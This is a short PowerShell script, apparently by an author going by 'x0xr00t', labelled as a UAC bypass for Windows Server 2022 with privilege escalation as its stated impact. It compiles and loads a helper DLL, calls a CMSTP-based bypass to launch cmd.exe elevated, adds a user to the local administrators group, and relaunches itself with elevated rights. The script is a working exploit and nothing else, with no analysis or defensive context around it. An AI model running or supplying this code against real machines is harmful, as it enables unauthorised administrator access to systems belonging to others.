#!-.ps1 
#
# Author : P.Hoogeveem
# Aka    : x0xr00t
# Build  : 20210809
# Name   : UAC Bypass Win Server 2022
# Impact : Privesc 
# 
# Usage  : run the powershell file and it makes the dll and places it in dir. 


#
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"

[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))

[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
net localgroup administrators {userhere} /add
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
{
  # Relaunch as an elevated process:
  Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb RunAs
  exit
}